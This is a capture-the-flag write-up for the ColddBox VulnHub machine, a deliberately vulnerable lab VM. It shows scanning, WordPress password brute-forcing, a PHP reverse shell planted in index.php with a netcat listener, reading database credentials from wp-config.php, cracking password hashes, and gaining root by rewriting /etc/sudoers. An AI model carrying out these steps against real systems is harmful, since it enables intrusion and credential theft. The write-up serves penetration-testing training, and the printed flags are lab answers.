
# ColddBox

Available on VulnHub: https://www.vulnhub.com/entry/colddbox-easy,586/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.148   08:00:27:ba:87:d0      1      xx  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.148
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 09:03 EST
Nmap scan report for 192.168.1.148
Host is up (0.00064s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.15 seconds
```

### Web Analysis

```
$ nikto -h http://192.168.1.148

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.148
+ Target Hostname:    192.168.1.148
+ Target Port:        80
+ Start Time:         2020-11-08 09:04:31 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /hidden/: This might be interesting...
+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2020-11-08 09:05:25 (GMT-5) (54 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ dirb http://192.168.1.148

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Nov  8 09:04:40 2020
URL_BASE: http://192.168.1.148/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.148/ ----
==> DIRECTORY: http://192.168.1.148/hidden/                                                                          
+ http://192.168.1.148/index.php (CODE:301|SIZE:0)                                                                   
+ http://192.168.1.148/server-status (CODE:403|SIZE:278)                                                             
==> DIRECTORY: http://192.168.1.148/wp-admin/                                                                        
==> DIRECTORY: http://192.168.1.148/wp-content/                                                                      
==> DIRECTORY: http://192.168.1.148/wp-includes/                                                                     
+ http://192.168.1.148/xmlrpc.php (CODE:200|SIZE:42)                                                                 
                                                                                                                     
---- Entering directory: http://192.168.1.148/hidden/ ----
+ http://192.168.1.148/hidden/index.html (CODE:200|SIZE:340)                                                         
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-admin/ ----
+ http://192.168.1.148/wp-admin/admin.php (CODE:302|SIZE:0)                                                          
==> DIRECTORY: http://192.168.1.148/wp-admin/css/                                                                    
==> DIRECTORY: http://192.168.1.148/wp-admin/images/                                                                 
==> DIRECTORY: http://192.168.1.148/wp-admin/includes/                                                               
+ http://192.168.1.148/wp-admin/index.php (CODE:302|SIZE:0)                                                          
==> DIRECTORY: http://192.168.1.148/wp-admin/js/                                                                     
==> DIRECTORY: http://192.168.1.148/wp-admin/maint/                                                                  
==> DIRECTORY: http://192.168.1.148/wp-admin/network/                                                                
==> DIRECTORY: http://192.168.1.148/wp-admin/user/                                                                   
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-content/ ----
+ http://192.168.1.148/wp-content/index.php (CODE:200|SIZE:0)                                                        
==> DIRECTORY: http://192.168.1.148/wp-content/languages/                                                            
==> DIRECTORY: http://192.168.1.148/wp-content/plugins/                                                              
==> DIRECTORY: http://192.168.1.148/wp-content/themes/                                                               
==> DIRECTORY: http://192.168.1.148/wp-content/upgrade/                                                              
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-admin/network/ ----
+ http://192.168.1.148/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                  
+ http://192.168.1.148/wp-admin/network/index.php (CODE:302|SIZE:0)                                                  
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-admin/user/ ----
+ http://192.168.1.148/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                     
+ http://192.168.1.148/wp-admin/user/index.php (CODE:302|SIZE:0)                                                     
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-content/languages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-content/plugins/ ----
+ http://192.168.1.148/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-content/themes/ ----
+ http://192.168.1.148/wp-content/themes/index.php (CODE:200|SIZE:0)                                                 
                                                                                                                     
---- Entering directory: http://192.168.1.148/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sun Nov  8 09:04:56 2020
DOWNLOADED: 36896 - FOUND: 13
```

### WordPress Analysis

```
$ wpscan -e ap,at,u --url http://192.168.1.148/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.10
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.148/ [192.168.1.148]
[+] Started: Sun Nov  8 10:54:01 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.148/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://192.168.1.148/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.148/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.1.148/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://192.168.1.148/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://192.168.1.148/wp-content/themes/twentyfifteen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://192.168.1.148/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.7
 | Style URL: http://192.168.1.148/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.148/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Nov  8 10:54:03 2020
[+] Requests Done: 17
[+] Cached Requests: 46
[+] Data Sent: 3.973 KB
[+] Data Received: 18.32 KB
[+] Memory used: 186.152 MB
[+] Elapsed time: 00:00:02
```

Users:
* hugo
* c0ldd
* philip

### WordPress Login Brute Forcing

I attempt to crack WordPress login with `wpscan` passing the users list that we found previously.
```
$ cat users.txt 
c0ldd
hugo
philip

$ wpscan --url http://192.168.1.148/ -U users.txt -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.10
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.148/ [192.168.1.148]
[+] Started: Sun Nov  8 10:59:05 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.148/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://192.168.1.148/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.148/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.1.148/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://192.168.1.148/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://192.168.1.148/wp-content/themes/twentyfifteen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://192.168.1.148/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.7
 | Style URL: http://192.168.1.148/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.148/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - c0ldd / 9876543210
```

User: **c0ldd** \
Pass: **9876543210**

### Reverse Shell

I used the PHP injection through WordPress login using the retrieved credentials.\
I added the PHP reverse shell code content (`reverse_shell.php`) in `index.php` file.\
So I listened the connection in my host and called `http://192.168.1.116/index.php`

```
$ nc -lvp 4444
listening on [any] 4444 ...
connect to [192.168.1.116] from (UNKNOWN) [192.168.1.148] 59136
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Spwaning a shell
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ColddBox-Easy:/var/www/html$
```

### DataBase Access

Searching DB credentials in WordPress configuration file
```
www-data@ColddBox-Easy:/$ cat /var/www/html/wp-config.php

<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'o[eR&,8+wPcLpZaE<ftDw!{,@U:p]_hc5L44E]Q/wgW,M==DB$dUdl_K1,XL/+4{');
define('SECURE_AUTH_KEY',  'utpu7}u9|FEi+3`RXVI+eam@@vV8c8x-ZdJ-e,mD<6L6FK)2GS }^:6[3*sN1f+2');
define('LOGGED_IN_KEY',    '9y<{{<I-m4$q-`4U5k|zUk/O}HX dPj~Q)<>#7yl+z#rU60L|Nm-&5uPPB(;^Za+');
define('NONCE_KEY',        'ZpGm$3g}3+qQU_i0E<MX_&;B_3-!Z=/:bqy$&[&7u^sjS!O:Yw;D.|$F9S4(&@M?');
define('AUTH_SALT',        'rk&S:6Wls0|nqYoCBEJls`FY(NhbeZ73&|1i&Zach?nbqCm|CgR0mmt&=gOjM[.|');
define('SECURE_AUTH_SALT', 'X:-ta$lAW|mQA+,)/0rW|3iuptU}v0fj[L^H6v|gFu}qHf4euH9|Y]:OnP|pC/~e');
define('LOGGED_IN_SALT',   'B9%hQAayJt:RVe+3yfx/H+:gF/#&.+`Q0c{y~xn?:a|sX5p(QV5si-,yBp|FEEPG');
define('NONCE_SALT',       '3/,|<&-`H)yC6U[oy{`9O7k)q4hj8x/)Qu_5D/JQ$-)r^~8l$CNTHz^i]HN-%w-g');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

define('WP_HOME', '/');
define('WP_SITEURL', '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```

DB_USER: **c0ldd** \
DB_PASS: **cybersecurity**

### MySQL Connection

```
www-data@ColddBox-Easy:/$ mysql -h localhost -u c0ldd -p
Enter password: cybersecurity

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 259421
Server version: 10.0.38-MariaDB-0ubuntu0.16.04.1 Ubuntu 16.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;

+--------------------+
| Database           |
+--------------------+
| colddbox           |
| information_schema |
+--------------------+
2 rows in set (0.00 sec)
```

Retrieving user's password hashes
```
MariaDB [colddbox]> use colddbox

MariaDB [colddbox]> SELECT user_login,user_pass FROM wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| c0ldd      | $P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1 |
| hugo       | $P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/ |
| philip     | $P$BXZ9bXCbA1JQuaCqOuuIiY4vyzjK/Y. |
+------------+------------------------------------+
3 rows in set (0.00 sec)
```

### Password Cracking

Hash identification
```
$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1

Possible Hashs:
[+] MD5(Wordpress)
--------------------------------------------------
```

Cracking hashes
```
$ cat credentials.hash 
$P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1
$P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/
$P$BXZ9bXCbA1JQuaCqOuuIiY4vyzjK/Y.

$ hashcat -m 400 credentials.hash /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-5500U CPU @ 2.40GHz, 5852/5916 MB (2048 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1:9876543210
$P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/:password123456
```

Credentials:
* **c0ldd** : **9876543210**
* **hugo** : **password123456**

### SSH Connection

I attempt SSH login with DB credentials while password cracking was running, and it works.
```
$ ssh c0ldd@192.168.1.148 -p4512
c0ldd@192.168.1.148's password: cybersecurity

Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing self-healing high availability clustering for MicroK8s!
   Super simple, hardened and opinionated Kubernetes for production.

     https://microk8s.io/high-availability

Pueden actualizarse 78 paquetes.
56 actualizaciones son de seguridad.

Last login: Mon Oct 19 18:48:20 2020 from 10.0.1.4 
c0ldd@ColddBox-Easy:~$ id
uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

### Flag #1

```
c0ldd@ColddBox-Easy:~$ cat user.txt 
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

### Privilege Escalation

The user `c0ldd` can run `vim`, `chmod` and `ftp` as root.
```
c0ldd@ColddBox-Easy:~$ sudo -l
[sudo] password for c0ldd: cybersecurity

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

I changed the rule for `c0ldd` user in `/etc/sudoers` file to allow all commands as root.
```
c0ldd@ColddBox-Easy:$ sudo vim /etc/sudoers

...
# User privilege specification
root	ALL=(ALL:ALL) ALL
c0ldd	ALL=(ALL:ALL) ALL
#c0ldd    ALL=/usr/bin/vim
#c0ldd    ALL=/bin/chmod
#c0ldd    ALL=/usr/bin/ftp
...

c0ldd@ColddBox-Easy:/etc$ sudo -l
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (ALL : ALL) ALL

c0ldd@ColddBox-Easy:/etc$ sudo bash
root@ColddBox-Easy:/etc# id
uid=0(root) gid=0(root) grupos=0(root)
```

### Flag #2

```
root@ColddBox-Easy:~# cat /root/root.txt 
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```
